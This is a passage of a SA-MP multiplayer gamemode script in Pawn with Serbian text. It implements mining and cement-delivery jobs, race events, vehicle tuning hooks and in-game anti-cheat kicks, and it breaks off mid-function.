			    if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && IsPlayerInAnyVehicle( playerid ) && GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 524 && VehCement[ GetPlayerVehicleID( playerid ) ] == true ) {
                    new time = gettime( );
			        new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
			        if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] ) {
				    	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
				    	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
				    	format( globalstring, sizeof( globalstring ), "| V:AC | %s[ID: %d] je stigao na marker pre vremena( za %d od %d sekundi ).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ] );
		        		AdminPoruka( ANTICHEAT, globalstring );
						return 1;
				    }

					Novi_DisablePlayerCheckpoint( playerid );
				    GameTextForPlayer( playerid, "~w~Pricekajte cement se istovaruje..", 5000, 1);
				    TogglePlayerControllable( playerid, false );
				    CheckpointStatus[ playerid ] = 0;
				    SetTimerEx( "Istovar", 5000, false, "dii", playerid, GetPlayerVehicleID( playerid ), 7 );
			    }
			}
			
			case 32: {
			    if( GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT && PlayerInfo[ playerid ][ xPosao ] == POSAO_RUDAR && PosaoRudar[ playerid ] != 0 && UzeoOpremu[ playerid ] == true ) {

                    Novi_DisablePlayerCheckpoint( playerid );
                    TogglePlayerControllable(playerid, 0);
					ApplyAnimation( playerid, "CHAINSAW", "CSAW_1", 4.1, 1, 1, 1, 0, 0 );
					PlayerPlaySound( playerid, 1056, 0.0, 0.0, 0.0 );
					SendJobMessage( playerid, "Poceli ste sa kopanjem sacekajte 20 sekundi.");
					GameTextForPlayer( playerid, "~w~Kopate~n~sacekajte par sekundi", 20000, 4 );
					rudarPosao[ playerid ][ rudarTimer ] = SetTimerEx( "Iskopavanje", 20000, false, "i", playerid );
				}
			}
			case 33: {
			    if( GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT && PlayerInfo[ playerid ][ xPosao ] == POSAO_RUDAR && PosaoRudar[ playerid ] != 0 && UzeoOpremu[ playerid ] == true ) {
			    	if( rudarPosao[ playerid ][ rudarIskopano ] >= 6 ) {
			    	
			    	    ClearAnimations( playerid );
			    	    RemovePlayerAttachedObject( playerid, OBJECT_NOSI );
			    	    Novi_DisablePlayerCheckpoint( playerid );
			    	    SendJobMessage( playerid, "Sacekajte 40 sekundi da se prerade iskopine.");
			    	    
			    	    rudarPosao[ playerid ][ rudarObjects ][ 0 ] = CreatePlayerObject( playerid, 19941, 976.29346, 353.03909, -32.30000,   0.00000, 0.00000, 0.00000 );
		 				rudarPosao[ playerid ][ rudarObjects ][ 1 ] = CreatePlayerObject( playerid, 19941, 976.21765, 353.19415, -32.30000,   0.00000, 0.00000, 0.00000 );
						rudarPosao[ playerid ][ rudarObjects ][ 2 ] = CreatePlayerObject( playerid, 19941, 976.08136, 353.09543, -32.30000,   0.00000, 0.00000, 0.00000 );

						MovePlayerObject( playerid, rudarPosao[ playerid ][ rudarObjects ][ 0 ], 987.68121, 370.19843, -35.85000, 0.5 );
						MovePlayerObject( playerid, rudarPosao[ playerid ][ rudarObjects ][ 1 ], 987.68268, 369.83670, -35.85000, 0.5 );
						MovePlayerObject( playerid, rudarPosao[ playerid ][ rudarObjects ][ 2 ], 987.45660, 370.03912, -35.85000, 0.5 );

						rudarPosao[ playerid ][ rudarTimer ] = SetTimerEx( "sekundiRudar", 40000, false, "i", playerid );
					}
			    }
			}
			case 34: {
			    if( GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT && PlayerInfo[ playerid ][ xPosao ] == POSAO_RUDAR && PosaoRudar[ playerid ] != 0 && UzeoOpremu[ playerid ] == true ) {
					
					DestroyPlayerObject( playerid, rudarPosao[ playerid ][ rudarObjects ][ 0 ] );
					DestroyPlayerObject( playerid, rudarPosao[ playerid ][ rudarObjects ][ 1 ] );
					DestroyPlayerObject( playerid, rudarPosao[ playerid ][ rudarObjects ][ 2 ] );
					Novi_DisablePlayerCheckpoint( playerid );
					
					CheckpointStatus[ playerid ] = 0;

                    new zlato = PlataPosla[PLATA_RUDAR] + random( 4 );

                    if(ServerInfo[HappyJob] == POSAO_RUDAR) {
                        zlato *= 2;
                        SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
                    }

                    BussinesJobMoney(POSAO_RUDAR, 500);

					SendJobMessage( playerid, "Uspesno ste zavrsili sa kopanjem!Iskopali ste %dg zlata.", zlato );
					

					PlayerInfo[ playerid ][ xZlato ] += zlato;
					SavePlayer( playerid );
					UpdateZlatoTD( playerid );
					
					RemovePlayerAttachedObject( playerid, OBJECT_SLOT_LHAND );
					RemovePlayerAttachedObject( playerid, OBJECT_NOSI );
					
					SetPlayerAttachedObject( playerid, OBJECT_SLOT_LHAND, 18634, 6, 0.048513, 0.018571, 0.028653, 314.764404, 226.953979, 222.510803, 1.000000, 1.000000, 1.000000 );
	        		SetPlayerAttachedObject( playerid, OBJECT_NOSI, 2060, 1, -0.191781, -0.162666, -0.003734, 88.812377, 0.000000, 0.408470, 1.000000, 1.000000, 1.000000 );
					
					rudarPosao[ playerid ][ rudarIskopano ] = 0;
					
					PosaoRudar[ playerid ] = 0;
			    }
			}
		}
	}
	return true;
}

forward sekundiRudar( playerid );
public sekundiRudar( playerid ) {

    Novi_KillTimer( rudarPosao[ playerid ][ rudarTimer ] );
	Novi_SetPlayerCheckpoint( playerid, 986.5834, 370.7523, -35.0238, 2.0 ); 
    CheckpointStatus[ playerid ] = 34;
    SendJobMessage( playerid, "Vase iskopine su preradjenje, odite da ih pokupite." );
    return true;
}

forward Iskopavanje( playerid );
public Iskopavanje( playerid ) {

	if( GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT && PlayerInfo[ playerid ][ xPosao ] == POSAO_RUDAR && PosaoRudar[ playerid ] != 0 && UzeoOpremu[ playerid ] == true ) {

		Novi_KillTimer( rudarPosao[ playerid ][ rudarTimer ] );
		ClearAnimations( playerid );
		rudarPosao[ playerid ][ rudarIskopano ]++;
		if( rudarPosao[ playerid ][ rudarIskopano ] < 6 ) {
			new broj = rudarPosao[ playerid ][ rudarIskopano ];
			Novi_SetPlayerCheckpoint( playerid, RandomRudnik[ broj ][ 0 ], RandomRudnik[ broj ][ 1 ], RandomRudnik[ broj ][ 2 ], 2.5 );
            CheckpointStatus[ playerid ] = 32;
            ClearAnimations( playerid );
            TogglePlayerControllable(playerid, 1);
            
			SendJobMessage( playerid, "Oznaceno vam je novo mesto, pratite marker!" );
		}
		else if( rudarPosao[ playerid ][ rudarIskopano ] >= 6 ) {

		    RemovePlayerAttachedObject( playerid, OBJECT_NOSI );
		    SetPlayerAttachedObject( playerid, OBJECT_NOSI, 2060, 1, 0.15, 0.4, 0.0, 0.0, 90.0, 0.0, 1.0, 1.0, 1.0 );

			RemovePlayerAttachedObject( playerid, OBJECT_SLOT_LHAND );
			SetPlayerAttachedObject( playerid, OBJECT_SLOT_LHAND, 18634, 1, -0.600000, 0.100000, 0.189999, 270.000000, 180.000000, 90.000000, 1.000000, 1.000000, 1.000000 );
            
            TogglePlayerControllable(playerid, 1);
            ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1 );

			Novi_SetPlayerCheckpoint( playerid, 975.2444, 352.1521, -35.0238, 2.0 );
            CheckpointStatus[ playerid ] = 33;
		    SendJobMessage( playerid, "Zavrsili ste sa kopanjem, sada odnesite da preradite iskopine!" );
		}
	}
	return true;
}

public OnPlayerLeaveCheckpoint( playerid ) {
	return true;
}

public OnPlayerEnterRaceCheckpoint( playerid ) {
	new cpid = PlayerCP[ playerid ];
	new nextcpid = PlayerCP[ playerid ]+1;
	new eventid = EventInfo[ eID ];
	if( cpid >= 2 ) {
		if( GetPlayerVehicleID( playerid ) == EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] ) {
		    SendClientMessageEx( playerid, 0x83BFBFAA, "-> || %s || Checkpoint %d/%d || %s || < -", Event[ eventid ][ Name ], (cpid-1), (Event[ eventid ][ MaxCP ]-1), ImeIgraca( playerid ) );
			PlayerCP[ playerid ]++;
			if( CheckPoint[ eventid ][ nextcpid ][ CPX ] == 0.0 && CheckPoint[ eventid ][ nextcpid ][ CPY ] == 0 ) {
                if( EventInfo[ Position ] <= 3 ) {
					new Price = 0;
					EventInfo[ Position ]++;
					
					if( EventInfo[ Position ] == 1 ) {
						PlayerInfo[ playerid ][ xEvent1Mesto ]++;
						Price = 3000;
					}
					if( EventInfo[ Position ] == 2 ) {
					    PlayerInfo[ playerid ][ xEvent2Mesto ]++;
						Price = 2000;
					}
					if( EventInfo[ Position ] == 3 ) {
					    PlayerInfo[ playerid ][ xEvent3Mesto ]++;
						Price = 1000;
					}
					
					DajIgracuNovac( playerid, Price );
					format( globalstring, 128, ""col_orange"%s Event | "col_white"Pozicija %d {A6A6A6}%s | "col_white"Nagrada {A6A6A6}%d$.", Event[ eventid ][ Name ], EventInfo[ Position ], ImeIgraca( playerid ), Price );
					SCMA( -1, globalstring );
					PlayerCP[ playerid ] = 0;
					SetVehicleToRespawn( GetPlayerVehicleID( playerid ) );
					SetPlayerVirtualWorld( playerid, 0 );
					TogglePlayerControllable( playerid, true );
					DisablePlayerRaceCheckpoint( playerid );
					
					Novi_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
					SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
					SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
					
					if( EventInfo[ Position ] == 3 ) {
					
					    format( globalstring, 128, ""col_orange"%s Event | "col_white"Event je zavrsen, cestitamo pobednicima.", Event[ eventid ][ Name ] );
						SCMA( -1, globalstring );
					
					    EventInfo[ Position ] = 0;
						EventInfo[ Drivers ] = 0;

						Event[ EventInfo[ eID ] ][ PrivremeniX1 ] = Event[ EventInfo[ eID ] ][ TCPX ];
					 	Event[ EventInfo[ eID ] ][ PrivremeniY1 ] = Event[ EventInfo[ eID ] ][ TCPY ];
					 	Event[ EventInfo[ eID ] ][ PrivremeniX2 ] = Event[ EventInfo[ eID ] ][ TCPX2 ];
					 	Event[ EventInfo[ eID ] ][ PrivremeniY2 ] = Event[ EventInfo[ eID ] ][ TCPY2 ];

					 	EventInfo[ eID ] = 0;

					 	for( new i = 0; i < 30; i++) {
					 		if( EventInfo[ Vehicle ][ i ] != INVALID_VEHICLE_ID ) SetVehicleToRespawn( EventInfo[ Vehicle ][ i ] );
						}

						foreach( Player, i ){
							if( PlayerCP[ i ] > 0 ) {
							
								PlayerCP[ i ] = 0;
								SetPlayerVirtualWorld( i, 0 );
								TogglePlayerControllable( i, true );
								DisablePlayerRaceCheckpoint( i );
								PlayerEventVehID[ i ] = -1;

					            Novi_SetPlayerPos( i, PlayerPos[ i ][ 0 ], PlayerPos[ i ][ 1 ],  PlayerPos[ i ][ 2 ] );
								SetPlayerVirtualWorld( i, PlayerPosVW[ i ] );
								SetPlayerInterior( i, PlayerPosInt[ i ] );
							}
						}
					}
				}
				return 1;
			}
			if( nextcpid != Event[ eventid ][ MaxCP ] ) SetPlayerRaceCheckpoint( playerid, 0, CheckPoint[ eventid ][ nextcpid ][ CPX ], CheckPoint[ eventid ][ nextcpid ][ CPY ], CheckPoint[ eventid ][ nextcpid ][ CPZ ], CheckPoint[ eventid ][ nextcpid+1 ][ CPX ], CheckPoint[ eventid ][ nextcpid+1 ][ CPY ], CheckPoint[ eventid ][ nextcpid+1 ][ CPZ ], 7.0 );
			else SetPlayerRaceCheckpoint( playerid, 1, CheckPoint[ eventid ][ nextcpid ][ CPX], CheckPoint[ eventid ][ nextcpid ][ CPY ], CheckPoint[ eventid ][ nextcpid ][ CPZ ], CheckPoint[ eventid ][ nextcpid ][ CPX ], CheckPoint[ eventid ][ nextcpid ][ CPY ], CheckPoint[ eventid ][ nextcpid ][ CPZ ], 7.0 );
		}
	}
	
	if( TrkaCheckpoint[ playerid ] != 0 ) {
	    switch( TrkaCheckpoint[ playerid ] ) {
	        case 1: {
	            if( IsPlayerInVehicle( playerid, TrkaVozilo[ playerid ] ) && NaUtrci[ playerid ] && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
	            	TrkaCheckpoint[ playerid ] = 2;
	            	SetPlayerRaceCheckpoint( playerid, 0, -1456.4524, -282.5754, 1050.6942, -1396.2809, -190.8598, 1051.4340, 7.0 );
				}
	        }
	        case 2: {
	            if( IsPlayerInVehicle( playerid, TrkaVozilo[ playerid ] ) && NaUtrci[ playerid ] && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
	            	TrkaCheckpoint[ playerid ] = 3;
	            	SetPlayerRaceCheckpoint( playerid, 0, -1396.2809, -190.8598, 1051.4340, -1302.6482, -147.4566, 1050.1260, 7.0 );
				}
	        }
	        case 3: {
	            if( IsPlayerInVehicle( playerid, TrkaVozilo[ playerid ] ) && NaUtrci[ playerid ] && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
	            	TrkaCheckpoint[ playerid ] = 4;
	            	SetPlayerRaceCheckpoint( playerid, 0, -1302.6482, -147.4566, 1050.1260, -1297.8522, -263.9526, 1048.8831, 7.0 );
				}
	        }
	        case 4: {
	            if( IsPlayerInVehicle( playerid, TrkaVozilo[ playerid ] ) && NaUtrci[ playerid ] && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
	            	TrkaCheckpoint[ playerid ] = 5;
	            	SetPlayerRaceCheckpoint( playerid, 0, -1297.8522, -263.9526, 1048.8831, -1389.8533, -254.1669, 1043.3276, 7.0 );
				}
			}
			case 5: {
	            if( IsPlayerInVehicle( playerid, TrkaVozilo[ playerid ] ) && NaUtrci[ playerid ] && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
	            	TrkaCheckpoint[ playerid ] = 6;
	            	SetPlayerRaceCheckpoint( playerid, 1, -1389.8533, -254.1669, 1043.3276, -1431.3984, -129.8569, 1045.4110, 7.0 );
				}
			}
	        case 6: {
				if( IsPlayerInVehicle( playerid, TrkaVozilo[ playerid ] ) && NaUtrci[ playerid ] && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
				
                    SetPlayerRaceCheckpoint( playerid, 0, -1431.3984, -129.8569, 1045.4110, -1456.4524, -282.5754, 1050.6942, 7.0 );
					TrkaCheckpoint[ playerid ] = 1;

					Krugovi[ playerid ]++;
				    SendClientMessageEx( playerid, 0x83BFBFAA, "-> || Trka || Krug %d/5 || %s || < -", Krugovi[ playerid ], ImeIgraca( playerid ) );
				    if( Krugovi[ playerid ] == 5 ) {
				        new izazivac = PonudioIgrac[ playerid ];

                        DisablePlayerRaceCheckpoint( playerid );
				        NaUtrci[ playerid ] = false; Krugovi[ playerid ] = 0; TrkaIzazov[ playerid ] = 0; StaroVreme[ playerid ] = 0;
					    Novi_DestroyVehicle( TrkaVozilo[ playerid ] ); TrkaVozilo[ playerid ] = -1;
						Novi_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
						SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
						SetPlayerInterior( playerid, PlayerPosInt[ playerid ] ); TrkaCheckpoint[ playerid ] = 0;
						DajIgracuNovac( playerid, ( UlogTrke[ playerid ]*2 ) );
						SendInfoMessage( playerid, "Pobedili ste na trci i osvojili %d$.", ( UlogTrke[ playerid ]*2 ) );

				        if( izazivac != IPI ) {
				        
				            DisablePlayerRaceCheckpoint( izazivac );
				            SendInfoMessage( izazivac, "Izgubili ste na trci i izgubili %d$.", UlogTrke[ playerid ] );
							NaUtrci[ izazivac ] = false; Krugovi[ izazivac ] = 0; TrkaIzazov[ izazivac ] = 0; StaroVreme[ izazivac ] = 0;
				            Novi_DestroyVehicle( TrkaVozilo[ izazivac ] ); TrkaVozilo[ izazivac ] = -1;
				            Novi_SetPlayerPos( izazivac, PlayerPos[ izazivac ][ 0 ], PlayerPos[ izazivac ][ 1 ],  PlayerPos[ izazivac ][ 2 ] );
							SetPlayerVirtualWorld( izazivac, PlayerPosVW[ izazivac ] );
							SetPlayerInterior( izazivac, PlayerPosInt[ izazivac ] ); TrkaCheckpoint[ izazivac ] = 0;
						}
					}
				}
			}
		}
	}
	return true;
}

public OnPlayerLeaveRaceCheckpoint( playerid )
{
	return true;
}

public OnRconCommand(cmd[])
{
	return true;
}

public OnPlayerRequestSpawn( playerid )
{

    if(IsPlayerNPC(playerid)) return 1;
    if( PlayerLogged[ playerid ] == true )
	{
		Novi_SetSpawnInfo( playerid );
    	SpawnPlayer( playerid );
	}
    else return false;
	return true;
}

public OnPlayerObjectMoved( playerid, objectid)
{

	return true;
}

public OnPlayerPickUpPickup( playerid, pickupid)
{
	return true;
}

public OnEnterExitModShop( playerid, enterexit, interiorid)
{
    if( enterexit == 1 ) {
        antiCheatCS[ playerid ][ InTuningGarage ] = true;
    }
    else if( enterexit == 0 ) {
        antiCheatCS[ playerid ][ InTuningGarage ] = false;
	}
    return 1;
}

public OnVehicleMod( playerid, vehicleid, componentid ) {

	new i = getVehicleScriptID(vehicleid);
	if( antiCheatCS[ playerid ][ InTuningGarage ] ) {
		if(PrivatnoVozilo(vehicleid)) {
			if( strcmp( ImeIgraca( playerid ), VehicleInfo[ i ][ vOwner ], true) == 0 ) {
				SavePlayerVehicleTuning( i, componentid );
				VehicleInfo[ i ][ vTuned ] = 1;
				if( !IsComponentidCompatible( GetVehicleModel( vehicleid ), componentid ) ) RemoveVehicleComponent( vehicleid, componentid);
			}
		}
	}
	else {
	    if( !PlayerTuningCar[ playerid ] ) {
			// Novi_DestroyVehicle( vehicleid );
			// if( i != -1 ) {
			
			// 	VehicleInfo[ i ][ vID ] = V01D_CreateVehicle( VehicleInfo[ i ][ vUsage ], i, VehicleInfo[ i ][ vModel ], VehicleInfo[ i ][ vLokacijaX ], VehicleInfo[ i ][ vLokacijaY ], VehicleInfo[ i ][ vLokacijaZ ]+1.0, VehicleInfo[ i ][ vLokacijaA ], VehicleInfo[ i ][ vColor1 ], VehicleInfo[ i ][ vColor2 ], 300000 );
	  //   		LinkVehicleToInterior( VehicleInfo[ i ][ vID ], VehicleInfo[ i ][ vInterior ] );
	  // 			SetVehicleVirtualWorld( VehicleInfo[ i ][ vID ], VehicleInfo[ i ][ vVirtualWorld ] );
			// 	vCanDrive[ VehicleInfo[ i ][ vID ] ] = 1;

			// 	GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
			// 	SetVehicleParamsEx( vehicleid, 0, lights, alarm,doors, 0, 0, objective );
   //          }
			SCM( playerid, -1, "Ukoliko mislis da si kickovan greskom slikaj ovo i postavi na forum!");
			format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Tuning hack", ImeIgraca( playerid ) );
			SendClientMessageToAll( SVETLOCRVENA, globalstring );
			Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Tuning hack");
			return 1;
		}
	}
	return true;
}

public OnVehiclePaintjob( playerid, vehicleid, paintjobid)
{

    new i = getVehicleScriptID(vehicleid);
	if( antiCheatCS[ playerid ][ InTuningGarage ] ) {
		if(PrivatnoVozilo(vehicleid)) {
		    if( strcmp( ImeIgraca( playerid ), VehicleInfo[ i ][ vOwner ], true) == 0 ) {
				VehicleInfo[ i ][ vPaintJob ] = paintjobid;
				VehicleInfo[ i ][ vTuned ] = 1; SaveVehicle( i );
			}
		}
	}
	else {
	    if( !PlayerTuningCar[ playerid ] ) {
			// Novi_DestroyVehicle( vehicleid );
   //          if( i != -1 ) {
			// 	VehicleInfo[ i ][ vID ] = V01D_CreateVehicle(VehicleInfo[ i ][ vUsage ], i, VehicleInfo[ i ][ vModel ], VehicleInfo[ i ][ vLokacijaX ], VehicleInfo[ i ][ vLokacijaY ], VehicleInfo[ i ][ vLokacijaZ ]+1.0, VehicleInfo[ i ][ vLokacijaA ], VehicleInfo[ i ][ vColor1 ], VehicleInfo[ i ][ vColor2 ], 300000 );
		 //        LinkVehicleToInterior( VehicleInfo[ i ][ vID ], VehicleInfo[ i ][ vInterior ] );
		 //        SetVehicleVirtualWorld( VehicleInfo[ i ][ vID ], VehicleInfo[ i ][ vVirtualWorld ] );
			// 	vCanDrive[ VehicleInfo[ i ][ vID ] ] = 1;

			// 	GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
			// 	SetVehicleParamsEx( vehicleid, 0, lights, alarm,doors, 0, 0, objective );
			// }
			SCM( playerid, -1, "Ukoliko mislis da si kickovan greskom slikaj ovo i postavi na forum!");
			format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Tuning hack", ImeIgraca( playerid ) );
			SendClientMessageToAll( SVETLOCRVENA, globalstring );
			Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Tuning hack");
			return 1;
		}
	}
	return true;
}

public OnVehicleRespray( playerid, vehicleid, color1, color2) {
    new i = getVehicleScriptID(vehicleid);
	if(PrivatnoVozilo(vehicleid)) {
		if( strcmp( ImeIgraca( playerid ), VehicleInfo[ i ][ vOwner ], true) == 0 ) {
			VehicleInfo[ i ][ vColor1 ] = color1;
			VehicleInfo[ i ][ vColor2 ] = color2;
			SaveVehicle( i );
		}
	}
	return true;
}

public OnPlayerSelectedMenuRow( playerid, row)
{
	return true;
}

public OnPlayerExitedMenu( playerid )
{
	return true;
}

public OnPlayerInteriorChange( playerid, newinteriorid, oldinteriorid)
{
	return true;
}

forward __check( playerid );
public __check( playerid )
{
	if( GetPlayerSpecialAction( playerid ) == SPECIAL_ACTION_DUCK )
		return 1;

    if(WARPInfo[ playerid ][ warID ] != -1) return 1;
    if(NaDmEventu[playerid]) return 1;

	// new Float:Zivot;
	// GetPlayerHealth( playerid, Zivot );
	// Novi_SetPlayerHealth( playerid, Zivot-30 );

	GameTextForPlayer( playerid, "~r~Prestani da radis C-Bug!", 1000, 3 );

    TogglePlayerControllable( playerid, 0 );

    defer cBugTimer(playerid);

	antiCheatCS[ playerid ][ LastWShot ] = -1;

	return 1;
}

stock IsCbugWeapon( playerid ) {
    new weaponID = GetPlayerWeapon( playerid );
    if( weaponID == 22 || weaponID == 24 || weaponID == 25 || weaponID == 27 ) {
		return true;
    }
	return false;
}

public OnPlayerKeyStateChange( playerid, newkeys, oldkeys ) {

    if(newkeys == 128 && oldkeys != 128 && GetPlayerWeapon(playerid) == 43) {
        camera[playerid] = 1;
        for(new a = 0; a < 9; a++) if(IsPlayerAttachedObjectSlotUsed(playerid, a)) RemovePlayerAttachedObject(playerid, a);
    }
    if(newkeys != 128 && oldkeys == 128 && GetPlayerWeapon(playerid) == 43) camera[playerid] = 0;

    // if (newkeys & KEY_LOOK_BEHIND && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
    // {
    //     if( Fuel[ GetPlayerVehicleID( playerid ) ] > 1 && IsVehicleAuto(GetPlayerVehicleID(playerid))) {
    //         ShowTextDrawsPanel(playerid);
    //     }
    //     return 1;
    // }

    // if(newkeys == KEY_FIRE && nosiTrainBox[playerid]) {

    //     new vehicleid, found;
    //     for( new i = 0; i < MAX_VEHICLES; i++ ) {
    //         new Float:X, Float:Y, Float:Z;
    //         GetVehiclePos( i, X, Y, Z );
    //         if( IsPlayerInRangeOfPoint( playerid, 5.0, X, Y, Z ) ) {
    //             vehicleid = i;
    //             found = 1;
    //             break;
    //         }
    //         else
    //             continue;
    //     }
    //     if( found == 0 ) {
    //         SendErrorMessage( playerid, "Niste blizu vozila.");
    //         return 1;
    //     }
    //     if( TipVozila[ vehicleid ] == ORGANIZACIJSKO_VOZILO ) {
    //         if( OrgaVozila[ vehicleid ] == PlayerInfo[ playerid ][ xClan ]) {
    //             new Float:vehPos[ 3 ];
    //             getPosBehindVehicle( vehicleid, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ], 0.0 );

    //             if(!IsPlayerInRangeOfPoint(playerid, 2.0, vehPos[0], vehPos[1], vehPos[2]))
    //                 return SendErrorMessage(playerid, "Moras biti iza kombija tvoje organizacije!");

    //             if(IsPlayerAttachedObjectSlotUsed(playerid, OBJECT_SLOT_FREE))
    //                 RemovePlayerAttachedObject(playerid, OBJECT_SLOT_FREE);

    //             SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);

    //             nosiTrainBox[playerid] = false;
    //             // vehBrojKutija[vehicleid]++;

    //             // SendInfoMessage(playerid, "Uspesno si utovario kutiju, ovo vozilo sada ima %d kutija!", vehBrojKutija[vehicleid]);

    //             return 1;

    //         }
    //         else return SendErrorMessage(playerid, "Moras biti blizu vozila svoje organizacije!");
    //     }
    //     else return SendErrorMessage(playerid, "Moras biti blizu organizacijskog vozila!");
    // }

    // if(newkeys == KEY_FIRE && trainActive && trainArrived && !nosiTrainBox[playerid]) {

    //     for(new i = 0; i < 6; i++) {
    //         if(IsPlayerInRangeOfPoint(playerid, 2.0, trainBoxPos[i][0], trainBoxPos[i][1], trainBoxPos[i][2]) && activeTrainBox[i]) {

    //             if(nosiTrainBox[playerid]) return 1;

    //             if(GetFactionType(playerid) != ORG_TIP_MAFIJA && GetFactionType(playerid) != ORG_TIP_BANDA) 
    //                 return SendErrorMessage(playerid, "Samo mafija/banda!");

    //             if(IsPlayerAttachedObjectSlotUsed(playerid, OBJECT_SLOT_FREE))
    //                 RemovePlayerAttachedObject(playerid, OBJECT_SLOT_FREE);
    //             SetPlayerAttachedObject(playerid, OBJECT_SLOT_FREE, 1271, 17, 0.215000, 0.537000, 0.000000, 1.799999, -1.400000, -17.800001, 1.000000, 1.000000, 1.000000);

    //             SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);

    //             if(IsValidDynamicObject(trainObjects[i]))
    //                 DestroyDynamicObject(trainObjects[i]);

    //             if(IsValidDynamic3DTextLabel(trainBoxLabel[i]))
    //                 DestroyDynamic3DTextLabel(trainBoxLabel[i]);

    //             nosiTrainBox[playerid] = true;

    //             activeTrainBox[i] = false;

    //             SendInfoMessage(playerid, "Uspesno si pokupio kutiju, koristi levi klik misa da je ostavis u org vozilo!");

    //             return 1;
    //         }
    //     }
    // }

    if(newkeys == KEY_SPRINT && PubgSkace[playerid] && PubgPokrenut) {

        new Float:pos[3];
        GetDynamicObjectPos(PubgAvionObjekat, pos[0], pos[1], pos[2]);

        SetPlayerPos(playerid, pos[0], pos[1], pos[2]-6.0);
        SetCameraBehindPlayer(playerid);

        GiveWeaponToPlayer(playerid, 46, 1);

        PubgSkace[playerid] = false;

        SetPlayerVirtualWorld(playerid, PubgVirtualWorld);

        SetPlayerWorldBounds(playerid, -878.1000823974609, -1850.100082397461, 2845.1125144958496, 1744.1125144958496);

        return 1;
    }

    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2)
    {
        if(!IsAPlane(GetPlayerVehicleID(playerid)) && !IsABoat(GetPlayerVehicleID(playerid)))
        {
            new vid = GetPlayerVehicleID(playerid);
            if(newkeys & ( KEY_LOOK_LEFT ) && newkeys & ( KEY_LOOK_RIGHT ))
            {
                if(Indicators_xqz[vid][2] /*|| Indicators_xqz[vid][5]*/) DestroyObject(Indicators_xqz[vid][5]),DestroyObject(Indicators_xqz[vid][2]), DestroyObject(Indicators_xqz[vid][3]),Indicators_xqz[vid][2]=0;
                else if(Indicators_xqz[vid][0] /*|| Indicators_xqz[vid][4]*/) DestroyObject(Indicators_xqz[vid][4]),DestroyObject(Indicators_xqz[vid][0]), DestroyObject(Indicators_xqz[vid][1]),Indicators_xqz[vid][0]=0;
                else
                SetVehicleIndicator(vid,1,1);
                return 1;
            }
            if(newkeys & KEY_LOOK_RIGHT)
            {
                if(Indicators_xqz[vid][0] /*|| Indicators_xqz[vid][4]*/) DestroyObject(Indicators_xqz[vid][4]), DestroyObject(Indicators_xqz[vid][0]), DestroyObject(Indicators_xqz[vid][1]),Indicators_xqz[vid][0]=0;
                else if(Indicators_xqz[vid][2]/*|| Indicators_xqz[vid][5]*/) DestroyObject(Indicators_xqz[vid][5]), DestroyObject(Indicators_xqz[vid][2]), DestroyObject(Indicators_xqz[vid][3]),Indicators_xqz[vid][2]=0;
                else
                SetVehicleIndicator(vid,0,1);
            }
            if(newkeys & KEY_LOOK_LEFT)
            {
                if(Indicators_xqz[vid][2]/*|| Indicators_xqz[vid][5]*/) DestroyObject(Indicators_xqz[vid][5]),DestroyObject(Indicators_xqz[vid][2]), DestroyObject(Indicators_xqz[vid][3]),Indicators_xqz[vid][2]=0;
                else if(Indicators_xqz[vid][0] /*|| Indicators_xqz[vid][4]*/) DestroyObject(Indicators_xqz[vid][4]),DestroyObject(Indicators_xqz[vid][0]), DestroyObject(Indicators_xqz[vid][1]),Indicators_xqz[vid][0]=0;
                else
                SetVehicleIndicator(vid,1,0);
            }
        }
    }

    if(newkeys == KEY_YES && RolexUToku) {

        for(new i = 0; i < 14; i++) {

            if(IsPlayerInRangeOfPoint(playerid, 1.0, RolexPickupPos[i][0],RolexPickupPos[i][1],RolexPickupPos[i][2]) && IsValidDynamicPickup(RolexPickup[i])) {

                if(PlayerInfo[playerid][xLider] != rolexRobaOrg) return 0;
                if(robaRafRolex[playerid]) return 0;

                TogglePlayerControllable(playerid, false);

                if(IsValidDynamicPickup(RolexPickup[i]))
                    DestroyDynamicPickup(RolexPickup[i]);

                if(IsValidDynamic3DTextLabel(RolexLabel[i]))
